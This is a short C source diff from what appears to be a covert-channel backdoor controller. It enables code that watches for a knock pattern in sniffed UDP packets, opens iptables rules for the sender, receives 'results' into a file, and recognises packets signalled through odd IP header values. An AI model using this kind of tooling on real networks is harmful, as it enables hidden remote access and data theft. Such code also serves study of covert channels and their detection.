@@ -106,14 +106,11 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
                 printf("Filter->pattern[0]: %d\n", Filter->pattern[0]);
                 printf("Filter->pattern[1]: %d\n", Filter->pattern[1]);
                 if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
-                    //iptables(Filter->targetip, "udp", PORT, true, false);
-                    //char *dip = Filter->targetip;
+                    iptables(Filter->targetip, "udp", PORT, true, false);
                     printf("WAITING FOR DATA\n");
-                    //port is open
-                    //recv results
-                    //recv_covert_udp
-                    //iptables(Filter->targetip, "tcp", PORT, true, true);
-                    //pcap_breakloop(interfaceinfo);
+                    recv_results(Filter->localip, UPORT, RESULT_FILE, false);
+                    iptables(Filter->targetip, "tcp", PORT, true, true);
+                    pcap_breakloop(interfaceinfo);
                 }
             }
         } else if(ip->ip_id == 'r' && ip->ip_tos == 'r' && ip->ip_ttl == 'r'){
